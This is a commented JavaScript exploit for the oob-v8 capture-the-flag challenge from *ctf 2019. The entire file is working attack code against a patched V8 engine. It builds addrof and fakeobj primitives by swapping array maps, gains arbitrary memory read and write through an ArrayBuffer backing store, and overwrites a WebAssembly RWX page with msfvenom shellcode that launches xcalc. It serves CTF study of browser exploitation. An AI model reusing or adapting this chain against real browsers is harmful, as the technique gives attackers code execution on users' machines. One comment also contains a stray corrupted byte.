// Exploit for the challenge oob-v8 from *ctf 2019

var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

var fl_arr = [1.1, 1.3, 1.3, 1.4];
var fl_arr_map = fl_arr.oob();
var tmp_obj = {}
var obj_arr = [tmp_obj];
var obj_arr_map = obj_arr.oob();

function addrof(in_obj) {

    // setting the object we want the address of as an element of obj_arr
    obj_arr[0] = in_obj;    
    
    // oob write. changing the map of obj_arr for the fl_arr map.
    obj_arr.oob(fl_arr_map);    

    // even though we are accesing obj_arr, the returned element will be a float
    let addr = obj_arr[0];  
    
    // oob write. restoring the map of the object for the original one
    obj_arr.oob(obj_arr_map);   
    
    // returning the integer representation of the leaked pointer
    return ftoi(addr);  
}

function fakeobj(addr) {
    // storing the float value of an arbitrary address as an element of fl_arr
    fl_arr[0] = itof(addr); 

    // oob write. replacing the map of the fl_arr to that of the obj_arr
    fl_arr.oob(obj_arr_map);

    // even though we are accessing fl_arr, the retur<F3>ned element will be a tagged pointer.
    let fake = fl_arr[0];

    // oob write. restoring original map of fl_arr
    fl_arr.oob(fl_arr_map);

    // returning tagged pointer of arbitrary address
    return fake;
}

var arb_rw_arr = [fl_arr_map, 1.2, 1.3, 1.4];
function arb_read(addr) {
    // We have to use tagged pointers for reading, so we tag the addr
    if (addr % 2n == 0)
    addr += 1n;

    // Place a fakeobj right on top of our crafted array with a float array map
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);

    // Change the elements pointer using our crafted array to read_addr-0x10
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);

    // Index 0 will then return the value at read_addr
    return ftoi(fake[0]);
}

function initial_arb_write(addr, val) {
    // Place a fakeobj right on top of our crafted array with a float array map
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);

    // Change the elements pointer using our crafted array to write_addr-0x10
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);

    // Write to index 0 as a floating point value
    fake[0] = itof(BigInt(val));
}

function arb_write(addr, val) {
    // creating an ArrayBuffer holding the value of a 64-bit pointer
    let buf = new ArrayBuffer(8);
    
    // creating a dataview for the ArrayBuffer object
    let dataview = new DataView(buf);
    
    // retrieving the address of the ArrayBuffer object
    let buf_addr = addrof(buf);
    
    // retrieveing the address of the backing_store pointer of the
    // ArrayBuffer object located at offset +0x20
    let backing_store_addr = buf_addr + 0x20n;
    
    // overwritting the backing_store pointer with the value we desire
    // to overwrite
    initial_arb_write(backing_store_addr, addr);
    
    // using the dataview to dereference the backing pointer and to
    // do the write for us
    dataview.setBigUint64(0, BigInt(val), true);
    // syntax: setBigUint64(byteOffset, value, littleEndian)
}


function exploit() {
    
    // based on https://wasdk.github.io/WasmFiddle/
    // this is some 'container' code implementing a return 0 to force 
    // the creation of a RWX page. contents will be overwritten with shellcode
    var wasm_code = new Uint8Array([
            0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,
            128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,
            128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,
            101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,
            0,1,132,128,128,128,0,0,65,0,11]
    );
    var wasm_mod = new WebAssembly.Module(wasm_code);
    var wasm_instance = new WebAssembly.Instance(wasm_mod);
    // retrieving entry-point of wasm instance
    var f = wasm_instance.exports.main;

    // retrieving rwx page base at offset 0x88 from wasm instance
    var rwx_page_addr = arb_read(addrof(wasm_instance)-1n+0x88n);

    function copy_shellcode(addr, shellcode) {
        let buf = new ArrayBuffer(0x100);
        let dataview = new DataView(buf);
        let buf_addr = addrof(buf);
    
        // retrieving ArrayBuffer's backing store pointer at offset 0x20
        let backing_store_addr = buf_addr + 0x20n;
        initial_arb_write(backing_store_addr, addr);

        for (let i = 0; i < shellcode.length; i++) {
        dataview.setUint32(4*i, shellcode[i], true);
        }
    }

    // msfvenom -p linux/x64/exec CMD='xcalc' --format dword
    var shellcode=[                 
        0x90909090,
        0x90909090,
        0x782fb848,
        0x636c6163,
        0x48500000,
        0x73752fb8,
        0x69622f72,
        0x8948506e,
        0xc03148e7,
        0x89485750,
        0xd23148e6,
        0x3ac0c748,
        0x50000030,
        0x4944b848,
        0x414c5053,
        0x48503d59,
        0x3148e289,
        0x485250c0,
        0xc748e289,
        0x00003bc0,
        0x050f00
    ];
    copy_shellcode(rwx_page_addr, shellcode);
    f();
}
exploit();
